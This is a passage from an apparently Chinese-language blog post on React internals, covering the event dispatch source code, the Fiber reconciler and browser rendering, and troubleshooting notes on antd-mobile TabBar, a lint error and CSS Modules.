<p><a href="https://github.com/facebook/react/blob/4175f05934d3954827c00b7633c1ce8e4e87d227/packages/react-reconciler/src/ReactWorkTags.js">HostComponent</a> &#x5E38;&#x91CF;&#x4E3A; 5&#x3002;</p>
<pre><code class="language-javascript">import { HostRoot, HostPortal, HostComponent, HostText, ScopeComponent, } from &apos;react-reconciler/src/ReactWorkTags&apos;;
...
export function dispatchEventForPluginEventSystem(
  domEventName: DOMEventName,
  eventSystemFlags: EventSystemFlags,
  nativeEvent: AnyNativeEvent,
  targetInst: null | Fiber,
  targetContainer: EventTarget,
): void {
  let ancestorInst = targetInst;
  if (
    (eventSystemFlags &amp; IS_EVENT_HANDLE_NON_MANAGED_NODE) === 0 &amp;&amp;
    (eventSystemFlags &amp; IS_NON_DELEGATED) === 0
  ) {
    const targetContainerNode = ((targetContainer: any): Node);

    // If we are using the legacy FB support flag, we
    // defer the event to the null with a one
    // time event listener so we can defer the event.
    if (
      enableLegacyFBSupport &amp;&amp;
      // If our event flags match the required flags for entering
      // FB legacy mode and we are processing the &quot;click&quot; event,
      // then we can defer the event to the &quot;document&quot;, to allow
      // for legacy FB support, where the expected behavior was to
      // match React &lt; 16 behavior of delegated clicks to the doc.
      domEventName === &apos;click&apos; &amp;&amp;
      (eventSystemFlags &amp; SHOULD_NOT_DEFER_CLICK_FOR_FB_SUPPORT_MODE) === 0 &amp;&amp;
      !isReplayingEvent(nativeEvent)
    ) {
      deferClickToDocumentForLegacyFBSupport(domEventName, targetContainer);
      return;
    }
    if (targetInst !== null) {
      // The below logic attempts to work out if we need to change
      // the target fiber to a different ancestor. We had similar logic
      // in the legacy event system, except the big difference between
      // systems is that the modern event system now has an event listener
      // attached to each React Root and React Portal Root. Together,
      // the DOM nodes representing these roots are the &quot;rootContainer&quot;.
      // To figure out which ancestor instance we should use, we traverse
      // up the fiber tree from the target instance and attempt to find
      // root boundaries that match that of our current &quot;rootContainer&quot;.
      // If we find that &quot;rootContainer&quot;, we find the parent fiber
      // sub-tree for that root and make that our ancestor instance.
      let node = targetInst;

      mainLoop: while (true) {
        if (node === null) {
          return;
        }
        const nodeTag = node.tag;
        if (nodeTag === HostRoot || nodeTag === HostPortal) {
          let container = node.stateNode.containerInfo;
          if (isMatchingRootContainer(container, targetContainerNode)) {
            break;
          }
          if (nodeTag === HostPortal) {
            // The target is a portal, but it&apos;s not the rootContainer we&apos;re looking for.
            // Normally portals handle their own events all the way down to the root.
            // So we should be able to stop now. However, we don&apos;t know if this portal
            // was part of *our* root.
            let grandNode = node.return;
            while (grandNode !== null) {
              const grandTag = grandNode.tag;
              if (grandTag === HostRoot || grandTag === HostPortal) {
                const grandContainer = grandNode.stateNode.containerInfo;
                if (
                  isMatchingRootContainer(grandContainer, targetContainerNode)
                ) {
                  // This is the rootContainer we&apos;re looking for and we found it as
                  // a parent of the Portal. That means we can ignore it because the
                  // Portal will bubble through to us.
                  return;
                }
              }
              grandNode = grandNode.return;
            }
          }
          // Now we need to find it&apos;s corresponding host fiber in the other
          // tree. To do this we can use getClosestInstanceFromNode, but we
          // need to validate that the fiber is a host instance, otherwise
          // we need to traverse up through the DOM till we find the correct
          // node that is from the other tree.
          while (container !== null) {
            const parentNode = getClosestInstanceFromNode(container);
            if (parentNode === null) {
              return;
            }
            const parentTag = parentNode.tag;
            if (parentTag === HostComponent || parentTag === HostText) {
              node = ancestorInst = parentNode;
              continue mainLoop;
            }
            container = container.parentNode;
          }
        }
        node = node.return;
      }
    }
  }

  batchedUpdates(() =&gt;
    dispatchEventsForPlugins(
      domEventName,
      eventSystemFlags,
      nativeEvent,
      ancestorInst,
      targetContainer,
    ),
  );
}
</code></pre>
<p><a href="https://github.com/facebook/react/blob/796d31809b3683083d3b62ccbab4f00dec8ffb1f/packages/react-dom/src/events/DOMPluginEventSystem.js#L414"><code>dispatchEventsForPlugins()</code></a> &#x4E2D; <code>extractEvents()</code> &#x751F;&#x6210; SyntheticEvent &#x5408;&#x6210;&#x4E8B;&#x4EF6;&#xFF0C;&#x800C; <code>processDispatchQueue()</code> &#x6267;&#x884C;&#x4E8B;&#x4EF6;&#x961F;&#x5217;&#x3002;</p>
<pre><code class="language-javascript">function dispatchEventsForPlugins(
  domEventName: DOMEventName,
  eventSystemFlags: EventSystemFlags,
  nativeEvent: AnyNativeEvent,
  targetInst: null | Fiber,
  targetContainer: EventTarget,
): void {
  const nativeEventTarget = getEventTarget(nativeEvent);
  const dispatchQueue: DispatchQueue = [];
  extractEvents(
    dispatchQueue,
    domEventName,
    targetInst,
    nativeEvent,
    nativeEventTarget,
    eventSystemFlags,
    targetContainer,
  );
  processDispatchQueue(dispatchQueue, eventSystemFlags);
}
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="faq-bugs">FAQ &amp; Bugs</h2>
<h3 id="react-fiber">React Fiber</h3>
<blockquote>
<p><a href="https://reactjs.org/docs/faq-internals.html#what-is-react-fiber">Fiber</a> &#x662F; React 16 &#x4E2D;&#x65B0;&#x7684;&#x534F;&#x8C03;&#x5F15;&#x64CE; =&gt; &#x4F7F; Virtual DOM &#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x589E;&#x91CF;&#x5F0F;&#x6E32;&#x67D3;&#x3002;</p>
</blockquote>
<blockquote>
<p><a href="https://github.com/acdlite/react-fiber-architecture#introduction">incremental rendering</a> &#x589E;&#x91CF;&#x5F0F;&#x6E32;&#x67D3;&#x80FD;&#x591F;&#x5C06;&#x6E32;&#x67D3;&#x5DE5;&#x4F5C;&#x5206;&#x5757;&#x5E76;&#x5C06;&#x5176;&#x5206;&#x6563;&#x5230;&#x591A;&#x4E2A;&#x5E27;&#x4E0A;&#x3002;</p>
</blockquote>
<p>&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;</p>
<p>&#x9875;&#x9762;&#x5143;&#x7D20;&#x8F83;&#x591A;&#xFF0C;&#x4E14;&#x9891;&#x7E41;&#x5237;&#x65B0;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;v15 &#x4F1A;&#x51FA;&#x73B0;&#x6389;&#x5E27;&#x7684;&#x73B0;&#x8C61;&#x3002;&#x7531;&#x4E8E;&#x91C7;&#x7528;&#x7684;&#x662F;&#x5168;&#x91CF;&#x6E32;&#x67D3;&#xFF0C;&#x6E32;&#x67D3;&#x8FC7;&#x7A0B;&#x4E0D;&#x53EF;&#x4E2D;&#x65AD;&#x3002;</p>
<p>&#x534F;&#x8C03;&#x5668; reconciler &#x4F1A;&#x8C03;&#x7528;&#x7EC4;&#x4EF6;&#x7684; render &#x51B3;&#x5B9A;&#x662F;&#x5426;&#x8FDB;&#x884C;&#x6302;&#x8F7D;&#xFF0C;&#x66F4;&#x65B0;&#x6216;&#x662F;&#x5378;&#x8F7D;&#x64CD;&#x4F5C;&#x3002;</p>
<p>&#x4ECE; v15 &#x5230; v16&#xFF0C;React &#x56E2;&#x961F;&#x82B1;&#x4E86;&#x4E24;&#x5E74;&#x65F6;&#x95F4;&#x5C06;&#x6E90;&#x7801;&#x67B6;&#x6784;&#x4E2D;&#x7684; Stack Reconciler &#x91CD;&#x6784;&#x4E3A; Fiber Reconciler&#x3002;</p>
<p>&#x9875;&#x9762;&#x8282;&#x70B9;&#x591A;&#xFF0C;&#x5C42;&#x6B21;&#x6DF1;&#x4F1A;&#x5BFC;&#x81F4;&#x9012;&#x5F52;&#x6E32;&#x67D3;&#x7684;&#x8017;&#x65F6;&#x589E;&#x52A0;&#xFF0C;&#x7531;&#x4E8E; UI &#x7EBF;&#x7A0B;&#x4E0E;&#x5355;&#x7EBF;&#x7A0B;&#x7684; JS &#x7EBF;&#x7A0B;&#x4E92;&#x65A5;&#xFF0C;&#x5F71;&#x54CD;&#x54CD;&#x5E94;&#x3002;</p>
<p>Fiber &#x5176;&#x5B9E;&#x662F;&#x4E00;&#x79CD;&#x6570;&#x636E;&#x7ED3;&#x6784;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x7EAF; JS &#x5BF9;&#x8C61;&#x8868;&#x793A;&#x3002;fiber &#x4E5F;&#x662F;&#x4E00;&#x4E2A;&#x6267;&#x884C;&#x5355;&#x5143;&#xFF0C;&#x6BCF;&#x6B21;&#x6267;&#x884C;&#x5B8C;&#x4E00;&#x4E2A;&#x6267;&#x884C;&#x5355;&#x5143;&#xFF0C;React &#x5C31;&#x4F1A;&#x68C0;&#x67E5;&#x8FD8;&#x5269;&#x591A;&#x5C11;&#x65F6;&#x95F4;&#xFF0C;&#x82E5;&#x6CA1;&#x6709;&#x65F6;&#x95F4;&#x5C31;&#x5C06;&#x63A7;&#x5236;&#x6743;&#x8BA9;&#x51FA;&#x53BB;&#x3002;</p>
<p>Fiber &#x56DB;&#x4E2A;&#x5173;&#x952E;&#x7279;&#x6027; =&gt; &#x589E;&#x91CF;&#x6E32;&#x67D3;&#xFF1B;&#x6682;&#x505C;&#x3001;&#x4E2D;&#x6B62;&#x3001;&#x590D;&#x7528;&#x6E32;&#x67D3;&#x4EFB;&#x52A1;&#xFF1B;&#x4F18;&#x5148;&#x7EA7;&#x66F4;&#x65B0;&#xFF1B;&#x5E76;&#x53D1;&#x80FD;&#x529B;</p>
<ul>
<li>&#x5E27; &amp; JS &#x963B;&#x585E;&#x6E32;&#x67D3;</li>
</ul>
<p>&#x4E3B;&#x6D41;&#x5237;&#x65B0;&#x9891;&#x7387;&#x4E3A; 60HZ&#xFF0C;&#x5373; 60 &#x5E27;&#x6BCF;&#x79D2;&#x3002;&#x6BCF;&#x5E27;&#x4E2D;&#x90FD;&#x4F1A;&#x5305;&#x62EC;&#x6837;&#x5F0F;&#x8BA1;&#x7B97;&#x3001;&#x5E03;&#x5C40;&#x548C;&#x7ED8;&#x5236;&#x3002;</p>
<blockquote>
<p><a href="https://chromium.googlesource.com/chromium/src/+/master/docs/threading_and_tasks.md">Chrome</a> has a multi-process architecture and each process is heavily multi-threaded.</p>
</blockquote>
<blockquote>
<p><a href="https://developer.mozilla.org/en-US/docs/Glossary/Main_thread">&#x4E3B;&#x7EBF;&#x7A0B;</a>&#x7528;&#x4E8E;&#x6D4F;&#x89C8;&#x5668;&#x5904;&#x7406;&#x7528;&#x6237;&#x4E8B;&#x4EF6;&#x548C;&#x9875;&#x9762;&#x7ED8;&#x5236;&#x7B49;&#x3002;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x5728;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x4E2D;&#x8FD0;&#x884C;&#x4E00;&#x4E2A;&#x9875;&#x9762;&#x4E2D;&#x7684;&#x6240;&#x6709; JavaScript &#x811A;&#x672C;&#xFF0C;&#x4EE5;&#x53CA;&#x5448;&#x73B0;&#x5E03;&#x5C40;&#xFF0C;&#x56DE;&#x6D41;&#xFF0C;&#x548C;&#x5783;&#x573E;&#x56DE;&#x6536;&#x3002;</p>
</blockquote>
<p>Performance insights &#x9762;&#x677F;&#x5F00;&#x542F;&#x5F55;&#x5236;&#x540E;&#x5206;&#x6790;&#xFF1A;Main &#x680F;&#x4E2D;&#x7684;&#x7070;&#x8272;&#x5757; Run Task &#x662F;&#x4E3B;&#x7EBF;&#x7A0B;&#x4E2D;&#x6267;&#x884C;&#x7684;&#x4EFB;&#x52A1;&#xFF0C;&#x7EFF;&#x8272;&#x5757; First Contentful Paint &#x8868;&#x793A;&#x9996;&#x6B21;&#x7ED8;&#x5236;&#x3002;</p>
<p>&#x5728;&#x9996;&#x6B21;&#x7ED8;&#x5236;&#x4E4B;&#x524D;&#x4F1A;&#x6709; Parse HTML &#x548C; Evaluate Script&#xFF0C;&#x800C;&#x540E;&#x8005;&#x8FD9;&#x7C7B;&#x963B;&#x585E; DOM Tree &#x751F;&#x6210;&#x7684; Script &#x4F1A;&#x5EF6;&#x957F; Parse HTML &#x7684;&#x8017;&#x65F6;&#x3002;</p>
<p>&#x968F;&#x540E;&#x662F;&#x7D2B;&#x8272;&#x5757;&#xFF1A;&#x8F93;&#x51FA; styleSheets &#x7684; Recalculate Style &#x548C;&#x7528;&#x4F5C;&#x5E03;&#x5C40;&#x7684; Layout&#x3002;</p>
<p>&#x6700;&#x540E;&#x662F; Details &#x4E2D;&#x67E5;&#x770B;&#x5230;&#x7684; Composite Layers&#x3002;</p>
<p>&#x5177;&#x4F53;&#x7684;&#x7ED8;&#x5236;&#x64CD;&#x4F5C;&#x4F1A;&#x5C06; Composite Layers &#x4EA4;&#x7ED9;&#x5408;&#x6210;&#x7EBF;&#x7A0B; Compositor&#x3002;</p>
<p>&#x5408;&#x6210;&#x7EBF;&#x7A0B;&#x5E76;&#x4E0D;&#x4F1A;&#x4E0E;&#x4E3B;&#x7EBF;&#x7A0B;&#x4E92;&#x65A5;&#x3002;</p>
<p>Script &#x7684;&#x6267;&#x884C;&#x548C; Paint &#x56FE;&#x5C42;&#x7684;&#x7ED8;&#x5236;&#x90FD;&#x53D1;&#x751F;&#x5728;&#x4E3B;&#x7EBF;&#x7A0B; Main&#x3002;</p>
<p>&#x6E32;&#x67D3;&#x88AB;&#x963B;&#x585E;&#x7684;&#x539F;&#x56E0;&#x662F;&#x7531;&#x4E8E; JS &#x6267;&#x65F6;&#x95F4;&#x8FC7;&#x957F;&#xFF0C;&#x5BFC;&#x81F4;&#x8FD9;&#x4E00;&#x5E27;&#x6CA1;&#x6709;&#x65F6;&#x95F4;&#x6267;&#x884C; Paint &#x4EFB;&#x52A1;&#x3002;</p>
<ul>
<li>Fiber &#x6267;&#x884C;&#x6D41;&#x7A0B;</li>
</ul>
<p>React &#x4E2D;&#x53EF;&#x901A;&#x8FC7; this.setState&#x3001;this.forceUpdate&#x3001;ReactDOM.render &#x7B49; API &#x89E6;&#x53D1;&#x66F4;&#x65B0;&#x3002;&#x66F4;&#x65B0;&#x53D1;&#x751F;&#x65F6;&#xFF0C;Reconciler &#x4F1A;&#x8C03;&#x7528;&#x7EC4;&#x4EF6;&#x7684; render &#x65B9;&#x6CD5;&#xFF0C;&#x5C06;&#x8FD4;&#x56DE;&#x7684; JSX &#x8F6C;&#x5316;&#x4E3A;&#x865A;&#x62DF; DOM&#xFF1B;&#x5C06;&#x865A;&#x62DF; DOM &#x548C;&#x4E0A;&#x6B21;&#x66F4;&#x65B0;&#x65F6;&#x7684;&#x865A;&#x62DF; DOM &#x5BF9;&#x6BD4;&#xFF1B;&#x901A;&#x8FC7;&#x5BF9;&#x6BD4;&#x627E;&#x51FA;&#x672C;&#x6B21;&#x66F4;&#x65B0;&#x4E2D;&#x53D8;&#x5316;&#x7684;&#x865A;&#x62DF; DOM&#xFF1B;&#x901A;&#x77E5; Renderer &#x5C06;&#x53D8;&#x5316;&#x7684;&#x865A;&#x62DF; DOM &#x6E32;&#x67D3;&#x5230;&#x9875;&#x9762;&#x4E0A;</p>
<p>Stack reconciler &#x662F; v15 &#x53CA;&#x66F4;&#x65E9;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x3002;Fiber &#x4ECE; v16 &#x5F00;&#x59CB;&#x6210;&#x4E3A;&#x9ED8;&#x8BA4;&#x7684; reconciler&#x3002;</p>
<p>React15 &#x67B6;&#x6784;&#x53EF;&#x4EE5;&#x5206;&#x4E3A; Reconciler &#x534F;&#x8C03;&#x5668;&#x548C; Renderer &#x6E32;&#x67D3;&#x5668;&#x4E24;&#x5C42;&#x3002;</p>
<p>Reconciler &#x534F;&#x8C03;&#x5668; =&gt; &#x8D1F;&#x8D23;&#x627E;&#x51FA;&#x53D8;&#x5316;&#x7684;&#x7EC4;&#x4EF6;&#xFF1B;<br>
Renderer &#x6E32;&#x67D3;&#x5668; =&gt; &#x6839;&#x636E; Reconciler &#x4E3A;&#x865A;&#x62DF; DOM &#x6253;&#x7684;&#x6807;&#x8BB0;&#xFF0C;&#x540C;&#x6B65;&#x6267;&#x884C;&#x5BF9;&#x5E94;&#x7684; DOM &#x64CD;&#x4F5C;<br>
&#x5728;React15&#x53CA;&#x4EE5;&#x524D;&#xFF0C;Reconciler&#x91C7;&#x7528;&#x9012;&#x5F52;&#x7684;&#x65B9;&#x5F0F;&#x521B;&#x5EFA;&#x865A;&#x62DF;DOM&#xFF0C;&#x9012;&#x5F52;&#x8FC7;&#x7A0B;&#x662F;&#x4E0D;&#x80FD;&#x4E2D;&#x65AD;&#x7684;&#x3002;&#x5982;&#x679C;&#x7EC4;&#x4EF6;&#x6811;&#x7684;&#x5C42;&#x7EA7;&#x5F88;&#x6DF1;&#xFF0C;&#x9012;&#x5F52;&#x4F1A;&#x5360;&#x7528;&#x7EBF;&#x7A0B;&#x5F88;&#x591A;&#x65F6;&#x95F4;&#xFF0C;&#x9012;&#x5F52;&#x66F4;&#x65B0;&#x65F6;&#x95F4;&#x8D85;&#x8FC7;&#x4E86;16ms&#xFF0C;&#x7528;&#x6237;&#x4EA4;&#x4E92;&#x5C31;&#x4F1A;&#x5361;&#x987F;&#x3002;</p>
<p>&#x4E3A;&#x4E86;&#x89E3;&#x51B3;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;React16&#x5C06;&#x9012;&#x5F52;&#x7684;&#x65E0;&#x6CD5;&#x4E2D;&#x65AD;&#x7684;&#x66F4;&#x65B0;&#x91CD;&#x6784;&#x4E3A;&#x5F02;&#x6B65;&#x7684;&#x53EF;&#x4E2D;&#x65AD;&#x66F4;&#x65B0;&#xFF0C;&#x7531;&#x4E8E;&#x66FE;&#x7ECF;&#x7528;&#x4E8E;&#x9012;&#x5F52;&#x7684;&#x865A;&#x62DF;DOM&#x6570;&#x636E;&#x7ED3;&#x6784;&#x5DF2;&#x7ECF;&#x65E0;&#x6CD5;&#x6EE1;&#x8DB3;&#x9700;&#x8981;&#x3002;&#x4E8E;&#x662F;&#xFF0C;&#x5168;&#x65B0;&#x7684;Fiber&#x67B6;&#x6784;&#x5E94;&#x8FD0;&#x800C;&#x751F;&#x3002;</p>
<p>&#x6BCF;&#x6B21;&#x6E32;&#x67D3;&#x6709;&#x4E24;&#x4E2A;&#x9636;&#x6BB5;&#xFF1A;Reconciliation(&#x534F;&#x8C03;render&#x9636;&#x6BB5;&#x3015;&#x548C;Commit(&#x63D0;&#x4EA4;&#x9636;&#x6BB5;&#x3015;</p>
<p>&#x534F;&#x8C03;&#x7684;&#x9636;&#x6BB5;&#xFF1A;&#x53EF;&#x4EE5;&#x8BA4;&#x4E3A;&#x662F;Diff&#x9636;&#x6BB5;&#xFF0C;&#x8FD9;&#x4E2A;&#x9636;&#x6BB5;&#x53EF;&#x4EE5;&#x88AB;&#x7EC8;&#x6B62;&#xFF0C;&#x8FD9;&#x4E2A;&#x9636;&#x6BB5;&#x4F1A;&#x627E;&#x51FA;&#x6240;&#x6709;&#x8282;&#x70B9;&#x53D8;&#x66F4;&#xFF0C;&#x4F8B;&#x5982;&#x8282;&#x70B9;&#x65B0;&#x589E;&#x3001;&#x5220;&#x9664;&#x3001;&#x5C5E;&#x6027;&#x53D8;&#x66F4;&#x7B49;&#x7B49;&#xFF0C;&#x8FD9;&#x6B64;&#x53D8;&#x66F4;React&#x79F0;&#x4E4B;&#x4E3A;&#x526F;&#x4F5C;&#x7528;&#x3002;</p>
<p>&#x63D0;&#x4EA4;&#x9636;&#x6BB5;&#xFF1A;&#x5C06;&#x4E0A;&#x4E00;&#x9636;&#x6BB5;&#x8BA1;&#x7B97;&#x51FA;&#x6765;&#x7684;&#x9700;&#x8981;&#x5904;&#x7406;&#x7684;&#x526F;&#x4F5C;&#x7528;(effects)&#x4E00;&#x6B21;&#x6027;&#x6267;&#x884C;&#x4E86;&#x3002;&#x8FD9;&#x4E2A;&#x9636;&#x6BB5;&#x5FC5;&#x987B;&#x540C;&#x6B65;&#x6267;&#x884C;&#xFF0C;&#x4E0D;&#x80FD;&#x88AB;&#x6253;&#x65AD;&#x3002;</p>
<h3 id="%E6%95%85%E9%9A%9C%E8%A7%A3%E9%99%A4">&#x6545;&#x969C;&#x89E3;&#x9664;</h3>
<ul>
<li>React &#x4F7F;&#x7528; antd-mobile &#x5F00;&#x53D1;&#x79FB;&#x52A8;&#x7AEF;&#x9879;&#x76EE;&#x65F6;&#xFF0C;&#x5728;&#x90E8;&#x5206;&#x754C;&#x9762;&#x7528;&#x5D4C;&#x5957;&#x8DEF;&#x7531;&#xFF08;&#x4E0D;&#x540C;&#x9875;&#x9762;&#x6E32;&#x67D3;&#x5185;&#x5BB9; + TavBar&#x6052;&#x56FA;&#x5B9A;&#xFF09;&#x65F6;&#x51FA;&#x73B0;&#x70B9;&#x51FB;&#x65E0;&#x6548;&#x7684;&#x60C5;&#x51B5;</li>
</ul>
<p>&#x7ECF;&#x68C0;&#x6D4B;&#x662F; antd-mobile &#x4E2D; <a href="https://mobile.ant.design/components/tab-bar-cn/#components-tab-bar-demo-basic">TabBar</a> &#x7EC4;&#x4EF6;&#x5E26;&#x6709;&#x4E00;&#x4E2A;&#x68C0;&#x6D4B;&#x7F29;&#x653E;&#x6EE1;&#x5C4F;&#x5C5E;&#x6027; fullScreen &#x7684;&#x76D2;&#x5B50;&#x5C06; TabBar &#x5143;&#x7D20;&#x5305;&#x88F9;&#x3002;&#x5373;&#x5982;&#x4E0B;&#x4EE3;&#x7801;&#xFF1A;</p>
<pre><code class="language-html">&lt;div style=&quot;position: fixed; height: 100%; width: 100%; top: 0px;&quot;&gt;
 ...
&lt;/div&gt;
</code></pre>
<p>&#x8FD9;&#x91CC;&#x770B;&#x5230;&#x4E00;&#x4E2A;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x662F;&#x8BBE;&#x7F6E; <code>z-index:-1</code> &#x3002;&#x5F53;&#x7136;&#x5728; JSX &#x884C;&#x5185;&#x5143;&#x7D20;&#x8BBE;&#x7F6E;&#x52A1;&#x5FC5;&#x6839;&#x636E;&#x9A7C;&#x5CF0;&#x5199;&#x6CD5;&#x6765;&#x8BBE;&#x7F6E;&#x6210; <code>zIndex:-1</code> &#xFF0C;&#x4F46;&#x662F;&#x7ECF;&#x672C;&#x4EBA;&#x5B9E;&#x8DF5;&#xFF0C;&#x6B21;&#x65B9;&#x6CD5;&#x4F1A;&#x5C06; TabBar &#x76F4;&#x63A5;&#x9690;&#x85CF;&#xFF0C;&#x6545;&#x4E0D;&#x53EF;&#x53D6;&#x3002;</p>
<p>&#x5B9E;&#x9645;&#x8FD9;&#x4E00;&#x5904;&#x7684;&#x4EE3;&#x7801;&#x53EA;&#x662F;&#x4E3A;&#x4E86;&#x6F14;&#x793A;&#x6839;&#x636E;&#x70B9;&#x51FB;&#x6807;&#x7B7E;&#x800C;&#x66F4;&#x6539; TabBar &#x7684;&#x653E;&#x7F6E;&#x4F4D;&#x7F6E;&#xFF0C;&#x82E5;&#x4E0D;&#x9700;&#x8981;&#x8FD8;&#x662F;&#x76F4;&#x63A5;&#x53BB;&#x9664;&#x8FD9;&#x4E2A;&#x5305;&#x88F9;&#x5BB9;&#x5668;&#x5373;&#x53EF;&#x3002;</p>
<ul>
<li>&#x6821;&#x9A8C;&#x62A5;&#x9519; =&gt; Typo in static class property declaration react/no-typos</li>
</ul>
<p>&#x68C0;&#x67E5;&#x5927;&#x5C0F;&#x5199; =&gt; <code>&#x7EC4;&#x4EF6;.propTypes = {}</code> &#x4E0D;&#x8981;&#x5199;&#x6210; <code>&#x7EC4;&#x4EF6;.PropTypes = {}</code>&#xFF0C;&#x524D;&#x8005;&#x7684; propTypes &#x662F; React.Component &#x7684;&#x7279;&#x6B8A;&#x5C5E;&#x6027;&#x3002;</p>
<ul>
<li>CSS Modules</li>
</ul>
<p>&#x5728;&#x914D;&#x7F6E;&#x8DEF;&#x7531;&#x65F6;&#xFF0C;&#x7EC4;&#x4EF6;&#x90FD;&#x88AB;&#x5BFC;&#x5165;&#x5230;&#x9879;&#x76EE;&#x4E2D;&#xFF0C;&#x90A3;&#x4E48;&#x7EC4;&#x4EF6;&#x7684;&#x6837;&#x5F0F;&#x4E5F;&#x5C31;&#x88AB;&#x5BFC;&#x5165;&#x5230;&#x9879;&#x76EE;&#x4E2D;&#x4E86;&#x3002;&#x5982;&#x679C;&#x7EC4;&#x4EF6;&#x4E4B;&#x95F4;&#x6837;&#x5F0F;&#x540D;&#x79F0;&#x76F8;&#x540C;&#xFF0C;&#x90A3;&#x4E48;&#x4E00;&#x4E2A;&#x7EC4;&#x4EF6;&#x4E2D;&#x7684;&#x6837;&#x5F0F;&#x5C31;&#x4F1A;&#x5728;&#x53E6;&#x4E00;&#x4E2A;&#x7EC4;&#x4EF6;&#x4E2D;&#x4E5F;&#x751F;&#x6548;&#xFF0C;&#x4ECE;&#x800C;&#x9020;&#x6210;&#x7EC4;&#x4EF6;&#x4E4B;&#x95F4;&#x6837;&#x5F0F;&#x76F8;&#x4E92;&#x8986;&#x76D6;&#x7684;&#x95EE;&#x9898;&#x3002;</p>
<p>CSS &#x4EC5;&#x662F;&#x7F51;&#x9875;&#x6837;&#x5F0F;&#x7684;&#x63CF;&#x8FF0;&#x65B9;&#x6CD5;&#x3002;Less&#x3001;SASS &#x5230; PostCSS &#x90FD;&#x662F;&#x4E3A;&#x4E86;&#x8BA9; CSS &#x66F4;&#x50CF;&#x4E00;&#x95E8;&#x7F16;&#x7A0B;&#x8BED;&#x8A00;&#xFF0C;&#x8FD9;&#x4E5F;&#x5BFC;&#x81F4;&#x4F7F;&#x7528;&#x8005;&#x589E;&#x52A0;&#x66F4;&#x591A;&#x7684;&#x5B66;&#x4E60;&#x6210;&#x672C;&#x3002;&#x662F;&#x5426;&#x5B58;&#x5728;&#x4E00;&#x79CD;&#x89C4;&#x5219;&#x5C11;&#xFF0C;&#x53C8;&#x4FDD;&#x8BC1;&#x67D0;&#x4E2A;&#x7EC4;&#x4EF6;&#x7684;&#x6837;&#x5F0F;&#x4E0D;&#x4F1A;&#x5F71;&#x54CD;&#x5230;&#x5176;&#x4ED6;&#x7EC4;&#x4EF6;&#x7684;&#x65B9;&#x6CD5;&#x2014;&#x2014; CSS Modules &#x901A;&#x8FC7;&#x53EA;&#x52A0;&#x5165;&#x4E86;&#x5C40;&#x90E8;&#x4F5C;&#x7528;&#x57DF;&#x548C;&#x6A21;&#x5757;&#x4F9D;&#x8D56;&#x89E3;&#x51B3;&#x7EC4;&#x4EF6;&#x6837;&#x5F0F;&#x51B2;&#x7A81;&#x3002;</p>
<p>React &#x9879;&#x76EE;&#x5728;&#x7528; <code>npx create-react-app my-app</code> &#x521B;&#x5EFA;&#x540E;&#x9700;&#x8981;&#x4F7F;&#x7528; CSS Modules &#x9700;&#x4FDD;&#x8BC1;&#x9879;&#x76EE;&#x5B58;&#x5728; css-loader &#x63D2;&#x4EF6;&#x3002;&#x8FD9;&#x91CC;&#x89E3;&#x91CA;&#x4E00;&#x4E0B;&#x4E3A;&#x4EC0;&#x4E48;&#x9700;&#x8981; css-loader &#x63D2;&#x4EF6;&#x3002;webpack &#x662F;&#x7528; JavaScript &#x7F16;&#x5199;&#xFF0C;&#x8FD0;&#x884C;&#x5728; Node &#x73AF;&#x5883;&#x91CC;&#x7684;&#x6253;&#x5305;&#x5DE5;&#x5177;&#xFF0C;&#x6240;&#x4EE5;&#x9ED8;&#x8BA4; webpack &#x6253;&#x5305;&#x7684;&#x65F6;&#x5019;&#x53EA;&#x4F1A;&#x5904;&#x7406;JS&#x4E4B;&#x95F4;&#x7684;&#x4F9D;&#x8D56;&#x5173;&#x7CFB;&#x3002;&#x5982;&#x679C;&#x5728; <code>.js</code> &#x6587;&#x4EF6;&#x4E2D;&#x5BFC;&#x5165;&#x4E86; css&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x9700;&#x8981;&#x4F7F;&#x7528; css-loader &#x8BC6;&#x522B;&#x8FD9;&#x4E2A;&#x5BFC;&#x5165;&#x7684; css &#x6A21;&#x5757;&#xFF0C;&#x901A;&#x8FC7;&#x7279;&#x5B9A;&#x7684;&#x8BED;&#x6CD5;&#x89C4;&#x5219;&#x8FDB;&#x884C;&#x8F6C;&#x6362;&#x5185;&#x5BB9;&#x6700;&#x540E;&#x5BFC;&#x51FA;&#x8FD9;&#x4E2A;&#x6A21;&#x5757;&#x6570;&#x7EC4;&#x3002;&#x56E0;&#x4E3A;&#x662F;&#x4E2A;&#x9875;&#x9762;&#x65E0;&#x6CD5;&#x76F4;&#x63A5;&#x8BC6;&#x522B;&#x7684;&#x6570;&#x7EC4;&#xFF0C;&#x8FD9;&#x65F6;&#x5C31;&#x9700;&#x8981;&#x7528;&#x5230;&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x63D2;&#x4EF6; style-loader &#x6765;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;style&#x6807;&#x7B7E;&#x53BB;&#x5305;&#x542B;&#x5904;&#x7406;&#x8FD9;&#x4E9B;&#x6837;&#x5F0F;&#x3002;&#x5426;&#x5219;&#x4F1A;&#x51FA;&#x73B0;&#x62A5;&#x9519;&#xFF1A;</p>
